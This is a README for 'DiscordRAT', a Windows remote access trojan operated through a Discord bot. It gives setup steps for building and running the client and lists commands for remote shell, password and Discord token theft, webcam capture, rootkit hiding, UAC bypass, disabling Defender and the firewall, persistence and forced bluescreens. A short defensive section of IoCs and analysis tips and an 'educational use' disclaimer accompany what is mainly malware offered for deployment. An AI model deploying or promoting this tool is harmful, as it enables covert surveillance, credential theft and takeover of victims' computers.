## DiscordRAT :P

Remote Administration Tool controlled via Discord, written in C#.

- Author: Draxo
- Acknowledgement: Uses prebuilt module DLLs originally published by "moom825" (PasswordStealer.dll, Webcam.dll, rootkit.dll, unrootkit.dll, Token grabber.dll)
- Approximate client size: ~75 KB

---

### Table of Contents
- [Overview](#overview)
- [Disclaimer](#disclaimer)
- [Modules Used](#modules-used)
- [Credits](#credits)
- [Setup Guide](#setup-guide)
- [Requirements](#requirements)
- [Commands](#commands)
- [Donation](#donation)

---

### Overview
Connects to the Discord Gateway, listens for commands in a configured guild/channel, and executes post-exploitation actions (file operations, shell, screenshots, webcam capture, persistence, etc.).

### Disclaimer
For educational and research purposes only. Use exclusively on systems you own or are explicitly authorized to test. The author is not responsible for misuse or damage.

### Modules Used
- Password stealing, token grabbing, webcam capture, and rootkit features are provided by prebuilt DLLs sourced from the "moom825" Discord-RAT-2.0 repository.

### Credits
- Rootkit by "bytecode77" → https://github.com/bytecode77/r77-rootkit

### Setup Guide
Download the precompiled binaries from the releases page.

1. Create a Discord bot in the Discord Developer Portal and add it to your server with sufficient permissions (admin recommended).
2. Open `builder.exe`, paste your bot token and the guild ID.
3. Run the generated `Client-built.exe`. It creates a control channel (e.g., `session-#`) and posts a session banner.

### Requirements
- Windows (x64)

### Defensive Analysis (for researchers)
- Architecture
  - Discord Gateway client over WebSocket; logs in with a bot token; listens for events; dispatches `!`-prefixed commands.
  - Dynamically downloads and loads DLL modules in-memory for passwords, tokens, webcam, and rootkit features.
  - Creates and uses a control channel named like `session-#` in the configured guild.
- Network Endpoints
  - `wss://gateway.discord.gg` (Discord Gateway)
  - `https://discord.com/api/v9/...` (messages, channels CRUD)
  - `https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/.../*.dll` (module DLLs)
  - `https://geolocation-db.com/json` (IP + geo)
  - `https://file.io/` (large file uploads)
- Persistence & Tampering
  - HKCU Run key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` value like `$77{exeName}`
  - Scheduled task (admin): `schtasks /create ... /rl HIGHEST` with name `$77{exeName}`
  - Task Manager disable: `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr=1`
  - Process critical flag via `NtSetInformationProcess`
- Command Categories
  - Execution/Control: `!shell`, `!website`, `!voice`, shutdown/restart/logoff
  - Filesystem: upload, download, delete, current/dir listing, wallpaper set
  - Collection: screenshot, clipboard, process list, geolocate, password/token grab
  - Webcam: list/select cams, capture picture
  - Privilege/Admin: UAC bypass attempt, defender/firewall disable, taskmgr disable/enable, startup, critical process
- Indicators of Compromise (IoCs)
  - Registry artifacts listed above; `$77`-prefixed values and scheduled task names
  - Discord artifacts: channels named `session-#`; bot posting session banners
  - Network to the endpoints above; raw GitHub DLL fetches
  - File artifacts: downloaded DLLs if saved temporarily (depends on run path)
- Safe VM Analysis Checklist
  - Isolate VM (no shared folders/clipboard); take a snapshot first
  - Block `gateway.discord.gg` and `discord.com` (hosts or firewall) to prevent real C2
  - Monitor with ProcMon (registry/files), ETW/process tracing, and packet capture
  - Perform static review of `Discord rat/Program.cs` for command handlers and URLs; inspect bundled DLLs with a .NET decompiler (do not execute)

### Commands
```
Available commands are :
--> !message = Show a message box displaying your text / Syntax  = "!message example"
--> !shell = Execute a shell command /Syntax  = "!shell whoami"
--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !cd = Changes directory
--> !dir = display all items in current dir
--> !download = Download a file from infected computer
--> !upload = Upload file to the infected computer / Syntax = "!upload file.png" (with attachment)
--> !uploadlink = Upload file to the infected computer / Syntax = "!upload link file.png"
--> !delete = deletes a file / Syntax = "!delete / path to / the / file.txt"
--> !write = Type your desired sentence on computer
--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
--> !clipboard = Retrieve infected computer clipboard content
--> !idletime = Get the idle time of user's on target computer
--> !currentdir = display the current dir
--> !block = Blocks user's keyboard and mouse / Warning : Admin rights are required
--> !unblock = Unblocks user's keyboard and mouse / Warning : Admin rights are required
--> !screenshot = Get the screenshot of the user's current screen
--> !exit = Exit program
--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
--> !uacbypass = attempt to bypass uac to gain admin by using windir and slui
--> !shutdown = shutdown computer
--> !restart = restart computer
--> !logoff = log off current user
--> !bluescreen = BlueScreen PC
--> !datetime = display system date and time
--> !prockill = kill a process by name / syntax = "!kill process"
--> !disabledefender = Disable windows defender(requires admin)
--> !disablefirewall = Disable windows firewall(requires admin)
--> !audio = play a audio file on the target computer / Syntax = "!audio" (with attachment)
--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)
--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)
--> !website = open a website on the infected computer / syntax = "!website www.google.com"
--> !disabletaskmgr = disable task manager(Admin rights are required)
--> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)
--> !startup = add to startup(when computer go on this file starts)
--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
--> !listprocess = Get all process's
--> !password = grab all passwords
--> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)
--> !unrootkit = Remove the rootkit(Admin rights are required)
--> !getcams = Grab the cameras names and their respected selection number
--> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax "!selectcam 1"
--> !webcampic = Take a picture out of the selected webcam
--> !grabtokens = Grab all discord tokens on the current pc
--> !help = This help menu
```

